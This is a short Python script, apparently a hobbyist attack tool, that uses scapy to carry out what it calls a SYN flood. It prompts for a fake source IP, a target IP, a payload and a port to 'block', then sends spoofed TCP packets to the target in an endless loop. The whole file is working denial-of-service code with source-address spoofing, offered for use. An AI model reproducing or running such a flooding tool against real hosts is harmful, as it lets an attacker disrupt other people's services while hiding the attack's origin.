from scapy.interfaces import get_if_list
from scapy.layers.inet import TCP, IP
from scapy.packet import Raw
from scapy.sendrecv import send

interfaces = get_if_list()
print(interfaces)
def syn_flood(src, target, message, dst_port):
    ip_layer = IP(src=src, dst=target)
    tcp_layer = TCP(sport=4444, dport=dst_port)
    raw_layer = Raw(load=message)
    packet = ip_layer / tcp_layer / raw_layer
    send(packet, iface="eth0")  # Замените "eth0" на имя вашего сетевого интерфейса

src = input("Enter Source IP Address To Fake: ")
target = input("Enter Target's IP Address: ")
message = input("Enter Message FOR TCP Payload: ")
dst_port = int(input("Enter Port to Block: "))

while True:
    syn_flood(src, target, message, dst_port)